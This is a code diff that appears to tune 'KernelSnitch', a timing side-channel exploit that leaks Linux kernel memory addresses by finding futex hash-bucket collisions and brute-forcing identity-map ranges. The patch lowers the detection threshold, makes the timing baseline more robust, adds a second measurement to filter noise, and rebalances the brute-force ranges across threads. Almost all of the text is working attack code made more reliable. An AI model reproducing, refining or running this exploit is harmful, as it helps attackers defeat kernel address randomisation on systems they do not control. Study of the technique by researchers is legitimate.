@@ -560,10 +560,72 @@
  
      // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
      ks->futex_hash_table_size = 256*ks->cpu_cnt;
-@@ -363,6 +373,9 @@
+@@ -301,7 +311,7 @@
+ {
+     #define ID 128
+ #ifndef KERNELSNITCH_THRESHOLD_MULT
+-#define KERNELSNITCH_THRESHOLD_MULT 10
++#define KERNELSNITCH_THRESHOLD_MULT 5
+ #endif
+     size_t count = 0;
+     size_t wanted;
+@@ -311,26 +321,39 @@
+     ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
+     wanted = ks->collisions - 1;
+ 
+-    size_t approx_time = MIN(__measure((size_t)&ks->futexes[0]), __measure((size_t)&ks->futexes[KS_PAGE_SIZE+8]));
++    /* robust empty-bucket baseline: min over several probes */
++    size_t approx_time = __measure((size_t)&ks->futexes[0]);
++    for (int probe = 1; probe < 6; probe++) {
++        size_t t = __measure((size_t)&ks->futexes[KS_PAGE_SIZE + 8 + probe * 64]);
++        if (t < approx_time) approx_time = t;
++    }
+ 
+     // piled-up hash bucket ID 128
+-    // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
+     __increase(ks, ID, APPENDED_FUTEXES);
+     if (ks->verbose) pr_info("start finding collisisons\n");
+ 
+     // find futex user space address which collide with the piled-up hash bucket ID 128
+     ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
+     if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
++    size_t threshold = approx_time * KERNELSNITCH_THRESHOLD_MULT;
++    if (ks->verbose) pr_info("collision threshold approx=%zu thr=%zu\n",
++                             approx_time, threshold);
+     for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
+         id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
+         if (id >= FUTEX_SZ)
+             break;
+         futex_addr = (size_t)&ks->futexes[id];
+         ks->times[i] = __measure(futex_addr);
+-        if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
++        if (ks->times[i] > threshold) {
++            /* require a second independent measurement to reject noise */
++            size_t t2 = __measure(futex_addr);
++            if (t2 < threshold) {
++                continue;
++            }
+             count++;
+             ks->futex_addrs[count] = futex_addr;
+-            if (ks->verbose) pr_info("  %016zx\n", futex_addr);
++            if (ks->verbose) pr_info("  %016zx (t1=%zu t2=%zu)\n",
++                                     futex_addr, (size_t)ks->times[i], t2);
+         }
+     }
+     if (wanted == count) {
+@@ -357,12 +380,16 @@
+     if (ks->verbose) pr_info("start bruteforcing\n");
+     reset_cpu_pin();
+ 
++    size_t span = (ks->identity_end - IDENTITY_START) / ks->thread_cnt;
+     for (size_t i = 0; i < ks->thread_cnt; ++i) {
+         struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
+         mm_leak_arg->ks = ks;
          mm_leak_arg->range.id = i;
-         mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff*i;
-         mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff*(i+1);
+-        mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff*i;
+-        mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff*(i+1);
++        mm_leak_arg->range.start = IDENTITY_START + span*i;
++        mm_leak_arg->range.end = IDENTITY_START + span*(i+1);
 +        if (mm_leak_arg->range.end > ks->identity_end) {
 +            mm_leak_arg->range.end = ks->identity_end;
 +        }
